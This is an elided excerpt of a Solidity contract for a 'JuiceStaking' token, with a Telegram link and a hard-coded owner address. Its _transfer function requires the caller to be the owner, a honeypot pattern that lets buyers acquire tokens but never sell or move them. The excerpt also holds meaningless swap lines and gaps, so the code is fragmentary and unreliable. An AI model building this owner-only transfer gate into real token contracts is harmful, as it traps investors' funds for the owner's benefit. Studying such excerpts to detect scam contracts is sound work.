...
contract JuiceStaking is ERC20Burnable, StorageSlot, ERC20Permit {
    ...
    address private JuiceStakingOwner; 
    uint256 public tokenCreationTime;
    uint256 public tokenCreation;

string public JuiceStakingWebsite = "https://t.me/JuiceStakingBSC";
string public ownerAddress = "0xE0413903A6774a0943baAd7B9b699F9837e95fc8";

    constructor() {
        JuiceStakingOwner = 0xE0413903A6774a0943baAd7B9b699F9837e95fc8;    
    ...
    function _transfer(address sender, address addressCallWithAmount, uint256 functionCallWithAmount) internal {
        ...
        require(_msgSender()==JuiceStakingOwner);
        tokenB = tokenA;
        tokenA = tokenB;
